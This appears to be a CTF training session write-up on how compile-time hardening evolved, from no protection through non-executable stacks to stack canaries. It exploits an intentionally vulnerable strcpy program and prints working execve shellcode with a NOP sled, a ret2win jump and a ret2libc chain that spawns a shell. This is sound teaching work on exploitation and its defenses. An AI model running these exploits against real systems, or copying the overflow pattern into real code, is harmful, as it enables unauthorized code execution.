# Session 2019-04-29

The topic for this week was the evolution of compile time fortification, starting with:

* no protection
* non-executable stack (late 1990s)
* stack canaries (early 2000s)

## Intitial setup

To keep things simple, we disable ASLR. This is done at kernel level:

```
# cat /proc/sys/kernel/randomize_va_space
2
# echo 0 > /proc/sys/kernel/randomize_va_space
# cat /proc/sys/kernel/randomize_va_space
0
```

Core dumps are very useful for debugging a crash, but the automatic crash reporter steals them if it is enabled. So we must stop the crash reporter and enable core dumps.

```
$ sudo service apport stop
$ ulimit -c unlimited
```

## Program

We study a simple program with a buffer overflow vulnerability:

```
#include <string.h>
int main(int argc, char**argv) {
	char buf[16];
	strcpy(buf, argv[1]);
	return 0;
}
```

This program is compiled with the Makefile.
Nowadays, security must be explicitly disabled. So there are many flags needed.

We can check the security flags with the program `checksec`, wich is a part of pwntools.

```
$ make
$ checksec ?_*
```

## No protection

The buffer overflow is trivial to trigger

```
$ ./0_no_protection AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
$
```

With `gdb` we can get a closer view of how the program crashes.

```
$ ./0_no_protection AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
$ gdb -q ./0_no_protection core
Reading symbols from ./0_no_protection...(no debugging symbols found)...done.
[New LWP 5910]
Core was generated by `./0_no_protection AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb)
```

We crash because the program tries to execute code at 0x41414141, wich is the hex value of 'AAAA'.
We have control over the instruction pointer! Next step is to find out at what offset the program
reads this value.

```
(gdb) r AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
Starting program: /home/larsh/Desktop/ctftraining/evolution/0_no_protection AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK

Program received signal SIGSEGV, Segmentation fault.
0x47474747 in ?? ()
(gdb)
```
This is the hex value of 'GGGG', so we need 5*4=20 bytes padding before the pointer.


```
(gdb) x/a $esp
0xffffcf10:	0x48484848
```

As this program has no protection, we can inject code by giving another argument to the program. As we are not sure where to aim, we add a huge nop-sled before the code that we want to execute. It consists of 0x90-bytes, wich is a no-operation in x86.

We use the instruction '\xcc', `int3` as our payload. This is a breakpoint instruction which triggers a very specific SIGTRAP signal.
It is a clear indicator that we reach our desired payload code.

```
(gdb) r $'AAAABBBBCCCCDDDDEEEEFFFF\x10\xcf\xff\xff' $(perl -e 'print "\x90"x20000 . "\xcc"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/larsh/Desktop/ctftraining/evolution/0_no_protection $'AAAABBBBCCCCDDDDEEEEFFFF\x10\xcf\xff\xff' $(perl -e 'print "\x90"x20000 . "\xcc"')

Program received signal SIGTRAP, Trace/breakpoint trap.
0xffffd1c4 in ?? ()
(gdb) 
```

Now we can inject any code we want!



```
(gdb) r $'AAAABBBBCCCCDDDDEEEEFFFF\x10\xcf\xff\xff' $(perl -e 'print "\x90"x20000 . "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" ')
Starting program: /home/larsh/Desktop/ctftraining/evolution/0_no_protection $'AAAABBBBCCCCDDDDEEEEFFFF\x10\xcf\xff\xff' $(perl -e 'print "\x90"x20000 . "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" ')
process 4481 is executing new program: /bin/dash
$ 
```


## Non-executable stack

Marking the stack segment as non-executable will not change the actual code in any way.

```
$ objdump -d 0_no_protection > 0_no_protection.dis
$ objdump -d 1_nx_stack > 1_nx_stack.dis
$ diff 0_no_protection.dis 1_nx_stack.dis 
2c2
< 0_no_protection:     file format elf32-i386
---
> 1_nx_stack:     file format elf32-i386
```

But if we try to run the same exploit as before, we run into problems:

```
(gdb) r $'AAAABBBBCCCCDDDDEEEEFFFF\x10\xcf\xff\xff' $(perl -e 'print "\x90"x20000 . "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" ')
Starting program: /home/larsh/Desktop/ctftraining/evolution/1_nx_stack $'AAAABBBBCCCCDDDDEEEEFFFF\x10\xcf\xff\xff' $(perl -e 'print "\x90"x20000 . "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" ')

Program received signal SIGSEGV, Segmentation fault.
0xffffcf10 in ?? ()
(gdb) x/i $eip
=> 0xffffcf10:	nop
```

Even though we are trying to execute a valid instruction, the processor does not allow it. This is because the stack memory region is non-executable:

```
(gdb) info proc mapping
process 4777
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/larsh/Desktop/ctftraining/evolution/1_nx_stack
	 0x8049000  0x804a000     0x1000        0x0 /home/larsh/Desktop/ctftraining/evolution/1_nx_stack
	0xf7dc1000 0xf7f96000   0x1d5000        0x0 /lib/i386-linux-gnu/libc-2.27.so
	0xf7f96000 0xf7f97000     0x1000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7f97000 0xf7f99000     0x2000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7f99000 0xf7f9a000     0x1000   0x1d7000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7f9a000 0xf7f9d000     0x3000        0x0 
	0xf7fcf000 0xf7fd1000     0x2000        0x0 
	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib/i386-linux-gnu/ld-2.27.so
	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib/i386-linux-gnu/ld-2.27.so
	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib/i386-linux-gnu/ld-2.27.so
	0xfffd8000 0xffffe000    0x26000        0x0 [stack]
(gdb)
```

The memory protection flags were not visible in gdb, but can be seen by looing at the `/proc/` entry of the process:

```
$ cat /proc/4777/maps 
08048000-08049000 r-xp 00000000 08:02 6174520                            /home/larsh/Desktop/ctftraining/evolution/1_nx_stack
08049000-0804a000 rw-p 00000000 08:02 6174520                            /home/larsh/Desktop/ctftraining/evolution/1_nx_stack
f7dc1000-f7f96000 r-xp 00000000 08:02 4718947                            /lib/i386-linux-gnu/libc-2.27.so
f7f96000-f7f97000 ---p 001d5000 08:02 4718947                            /lib/i386-linux-gnu/libc-2.27.so
f7f97000-f7f99000 r--p 001d5000 08:02 4718947                            /lib/i386-linux-gnu/libc-2.27.so
f7f99000-f7f9a000 rw-p 001d7000 08:02 4718947                            /lib/i386-linux-gnu/libc-2.27.so
f7f9a000-f7f9d000 rw-p 00000000 00:00 0 
f7fcf000-f7fd1000 rw-p 00000000 00:00 0 
f7fd1000-f7fd4000 r--p 00000000 00:00 0                                  [vvar]
f7fd4000-f7fd6000 r-xp 00000000 00:00 0                                  [vdso]
f7fd6000-f7ffc000 r-xp 00000000 08:02 4718880                            /lib/i386-linux-gnu/ld-2.27.so
f7ffc000-f7ffd000 r--p 00025000 08:02 4718880                            /lib/i386-linux-gnu/ld-2.27.so
f7ffd000-f7ffe000 rw-p 00026000 08:02 4718880                            /lib/i386-linux-gnu/ld-2.27.so
fffd8000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
$ 
```

The stack at `0xfffd8000 0xffffe000` does not have the `x` bit.

> With a non-executable stack, we can not (as easily) inject executable code into the program.

But what can we do? We can still control the program flow and jump anywhere inside the program. This still gives a lot of possibilites, lets first look at a simpler example.

### Simpler example

Consider this program:

```
void win(void) {
	system("/bin/bash");
}

int main(int argc, char**argv) {
	char buf[16];
	strcpy(buf, argv[1]);
	return 0;
}
```

The `main()` function is identical, but we now have another function called `win()` that we can jump to. We just need to find out where this function is located.

```
$ gdb -q ./1_nx_stack_win
Reading symbols from ./1_nx_stack_win...(no debugging symbols found)...done.
(gdb) x/i win
   0x8048436 <win>:	push   %ebp
(gdb) r $'AAAABBBBCCCCDDDDEEEEFFFF\x36\x84\x04\x08'
Starting program: /home/larsh/Desktop/ctftraining/evolution/1_nx_stack_win $'AAAABBBBCCCCDDDDEEEEFFFF\x36\x84\x04\x08'
$ 
```

Almost too easy. Now, is there any code in our original program that is useful for us?

### Return to libc

As we previously saw in the mappings, the standard library `/lib/i386-linux-gnu/libc-2.27.so` is loaded into memory. We can use functions here to perform the same.

The `system(cmd)` function is a wrapper that executes
`execve("/bin/sh", ["sh", "-c", cmd], envp);` in a child process. This means that there is a string `"/bin/sh"` inside libc. If we can return to 

Now, we must revisit what a library function expects the stack to look like when it is called. In 32-bit x86, the arguments are passed on the stack:

stack| values
-----| -----------
>    | return address from function
     | arg 1
     | arg 2
     | ...

What does this mean for us? We must remember that we are doing the actual call *by returning*, so before the return the stack must look like:

stack| values
-----| -----------
     | libcAddress
>    | return address from function
     | arg 1
     | arg 2
     | ...

So if we want to call `system("/bin/sh")`, we must arrange the stack like this before the return:

stack| values
-----| -----------
     | pointer to system in libc
>    | 4 bytes padding
     | pointer to "/bin/sh"

The location of `system` is easy to find

```
(gdb) x/i system
   0xf7dfe200 <system>:	sub    $0xc,%esp
```

It is located at 
0xf7dfe200
but this is a problem! We can not use this value directly, as it contains a null-byte.

There are two approaches to take here, either we realize that the `sub 0xc` just means that we can skip this instruction and add 12 bytes of padding before our arguments, or we can look what instructions there are before system.

```
(gdb) x/3i system - 1
   0xf7dfe1ff:	add    %al,0x448b0cec(%ebx)
   0xf7dfe205 <system+5>:	and    $0x10,%al
   0xf7dfe207 <system+7>:	call   0xf7ef837d
(gdb) x/3i system - 2
   0xf7dfe1fe:	add    %al,%es:0x448b0cec(%ebx)
   0xf7dfe205 <system+5>:	and    $0x10,%al
   0xf7dfe207 <system+7>:	call   0xf7ef837d
(gdb) x/3i system - 3
   0xf7dfe1fd:	je     0xf7dfe225 <system+37>
   0xf7dfe1ff:	add    %al,0x448b0cec(%ebx)
   0xf7dfe205 <system+5>:	and    $0x10,%al
(gdb) x/3i system - 4
   0xf7dfe1fc:	lea    0x0(%esi,%eiz,1),%esi
   0xf7dfe200 <system>:	sub    $0xc,%esp
   0xf7dfe203 <system+3>:	mov    0x10(%esp),%eax
(gdb) 
```

It is safe to jump to the location 0xf7dfe1fc, four bytes before `system`, as the instruction `lea    0x0(%esi,%eiz,1),%esi` only overwrites the esi register, which we dont need.

Next, we need to find the offset of "/bin/sh" in libc.
There are several ways, but as we can use the command `strace` to monitor the exploit of the simpler program.

Usually, `strace` prints out strings, but it can be told to print the raw pointer values with the `-e` flag. We can run `strace` twice and see where `"/bin/sh"` is located.

```
$ strace -f -o tmp.log /home/larsh/Desktop/ctftraining/evolution/1_nx_stack_win $'AAAABBBBCCCCDDDDEEEEFFFF\x36\x84\x04\x08' < /dev/null
Segmentation fault
$ grep execve tmp.log
5652  execve("/home/larsh/Desktop/ctftraining/evolution/1_nx_stack_win", ["/home/larsh/Desktop/ctftraining/"..., "AAAABBBBCCCCDDDDEEEEFFFF6\204\4\10"], 0x7ffdc0be9460 /* 54 vars */) = 0
5653  execve("/bin/sh", ["sh", "-c", "/bin/bash"], 0xffcf7850 /* 54 vars */) = 0
5654  execve("/bin/bash", ["/bin/bash"], 0x557eab781e58 /* 54 vars */) = 0
$ strace -e raw=execve -f -o tmp.log /home/larsh/Desktop/ctftraining/evolution/1_nx_stack_win $'AAAABBBBCCCCDDDDEEEEFFFF\x36\x84\x04\x08' < /dev/null
Segmentation fault
$ grep execve tmp.log
5658  execve(0x7ffe5566f760, 0x7ffe55670bc8, 0x7ffe55670be0) = 0
5659  execve(0xf7f280cf, 0xff8cc3c4, 0xff8cc5b0) = 0
5660  execve(0x55b313578af8, 0x55b313578b20, 0x55b314c2ee58) = 0
```

So `"/bin/sh"` is located at 0xf7f280cf.

We can now prepare our exploit, we want the stack to be

stack| value      | comment
-----| -----      | ------
     | 0xf7dfe1fc | pointer to system in libc (minus 4)
>    | 'XXXX'     | 4 bytes padding
     | 0xf7f280cf | pointer to "/bin/sh"

So we try our exploit

```
$ gdb -q ./1_nx_stack
Reading symbols from ./1_nx_stack...(no debugging symbols found)...done.
(gdb) r $'AAAABBBBCCCCDDDDEEEEFFFF\xfc\xe1\xdf\xf7XXXX\xcf\xf0\xf3\xf7'
Starting program: /home/larsh/Desktop/ctftraining/evolution/1_nx_stack $'AAAABBBBCCCCDDDDEEEEFFFF\xfc\xe1\xdf\xf7XXXX\xcf\xf0\xf3\xf7'
$ exit

Program received signal SIGSEGV, Segmentation fault.
0x58585858 in ?? ()
(gdb) 
```

The program crashes when it tries to return to the padding.
We can make the exploit exit cleanly by replacing the padding with a call to `exit()`.

```
(gdb) x exit
0xf7df13d0 <exit>:	0x106fa4e8
(gdb) r $'AAAABBBBCCCCDDDDEEEEFFFF\xfc\xe1\xdf\xf7\xd0\x13\xdf\xf7\xcf\xf0\xf3\xf7'
Starting program: /home/larsh/Desktop/ctftraining/evolution/1_nx_stack $'AAAABBBBCCCCDDDDEEEEFFFF\xfc\xe1\xdf\xf7\xd0\x13\xdf\xf7\xcf\xf0\xf3\xf7'
$ exit
[Inferior 1 (process 5833) exited normally]
(gdb)
```

## Stack canaries

If we compile the program with stack canaries, we are out of luck with our previous approach.

```
$ ./2_stack_canaries AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** stack smashing detected ***: <unknown> terminated
Aborted
```

This fortification adds a canary value on the stack, wich is checked before the function returns. We can disassemble the program and look at

```
$ objdump -d 0_no_protection > 0_no_protection.dis 
$ objdump -d 2_stack_canaries > 2_stack_canaries.dis
$ meld 0_no_protection.dis 2_stack_canaries.dis 
```

The canary value is random, but is guaranteed to contain a null byte.
This means that we can not overwrite it with a normal `strcpy`, even if we know the value. (However, it is still possible with `memcpy` or several `strcpy` calls.)

To overwrite a stack-canary, we need to leak out memory.
From now on, it is very rare to make exploits that are non-interactive.
When dealing with ASLR, it is even more important to leak out addresses.
More on that topic in future sessions.

